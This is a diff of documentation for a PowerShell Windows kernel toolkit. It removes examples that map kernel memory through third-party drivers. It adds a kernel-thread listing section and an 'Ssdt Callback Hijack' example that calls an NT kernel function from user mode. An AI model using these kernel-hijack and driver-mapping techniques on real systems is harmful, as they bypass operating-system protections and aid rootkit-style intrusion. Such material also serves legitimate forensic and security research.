@@ -298,55 +298,42 @@ Index ProcessName    PETHREAD_Address   ThreadID IsMainThread PreviousMode Previ
     1 powershell_ise 0xFFFFC3823EEAA080   5656         True 1 (UserMode) 0xFFFFC3823EEAA2B2 0xFFFFC3823EEAA568 134261727195048761 17/06/2026 15:25:19.504
     2 powershell_ise 0xFFFFC3823FFE6080   4780        False 1 (UserMode) 0xFFFFC3823FFE62B2 0xFFFFC3823FFE6568 134261727195120853 17/06/2026 15:25:19.512
 ````
-### 11. Map Kernel Address Space
-Map a physical or virtual kernel memory region into user space for inspection and analysis.
-```powershell
-# 1` Version
+### 11. Get-KernelThreadList
 
+Forensically extracts active kernel-mode thread objects (ETHREAD) from the system memory. 
+
+Targeting: EPROCESS-to-ETHREAD linkage traversal.
+
+Usage:
+Get-KernelThreadList -ProcessId <Int32> -Verbose
+
+Output Schema:
+
+````
+Index ProcessName    PETHREAD_Address   ThreadID IsMainThread PreviousMode PreviousAddress    Flink_Pointer           CreateTimeRaw      CreateTimeValue
+----- -----------    ----------------   -------- ------------ ------------ ---------------    -------------           -------------      ---------------
+    1 powershell_ise 0xFFFFC3823EEAA080   5656         True 1 (UserMode) 0xFFFFC3823EEAA2B2 0xFFFFC3823EEAA568 134261727195048761 17/06/2026 15:25:19.504
+    2 powershell_ise 0xFFFFC3823FFE6080   4780        False 1 (UserMode) 0xFFFFC3823FFE62B2 0xFFFFC3823FFE6568 134261727195120853 17/06/2026 15:25:19.512
+````
+### 12. Ssdt Callback Hijack
+hijack NT Kernel Address, And invoke it From user Mode, Work Only in build < 2200
+```powershell
 Clear-Host
 Write-Host
-$va = Map-VirtualAddress -VirtualAddress (Get-KernelBaseAddress) -BlockSize 1024 -DriverName iobios
-if ($null -ne $va -and $va -ne 0L) {
-    $Address = try { [IntPtr]$va } catch { [IntPtr]$va.MappedAddress }
-    $Data = [byte[]]::new(1024)
-    [marshal]::Copy($Address, $Data,0, 1024)
-    $Data | Format-HexView -Mode 16x
-    Unmap-VirtualAddress -MappedAddress $va -DriverName iobios | Out-Null
+
+$KernelVA = Get-KernelBaseAddress
+"VA: 0x{0:X16}" -f [Int64]$KernelVA
+
+$Values = $KernelVA, 0L
+$PA = Invoke-SsdtCallbackHijack `
+    -Function MmGetPhysicalAddress `
+    -Values $Values
+if ($PA -notin @(0,1)) {
+    "PA: 0x{0:X16}" -f $PA
 }
+
 Write-Host
-
-# 2` Version
-
-try {
-    $MapObj = Map-KernelMemory `
-        -VA (Get-KernelBaseAddress) `
-        -Size 200 -Mode gibepext `
-        -CacheType MmCached
-    if ($MapObj.MappedAddress -ne 0) {
-        Read-KernelMemory `
-            -VA $MapObj.MappedAddress `
-            -AsByte
-    }
-} finally {
-    Free-IntPtr `
-        -handle $MapObj.Device `
-        -Method NtHandle
-}
-
-try {
-    $MapObj = Map-KernelMemory `
-        -VA (Get-KernelBaseAddress) `
-        -Size 200 -Mode LECOMA `
-        -CacheType MmCached
-    if ($MapObj.MappedAddress -ne 0) {
-        [marshal]::ReadByte($MapObj.MappedAddress)
-    }
-    
-} finally {
-    Free-IntPtr `
-        -handle $MapObj.Device `
-        -Method NtHandle
-}
+return
 ```
 
 ### 12. Kernel Memory Operations
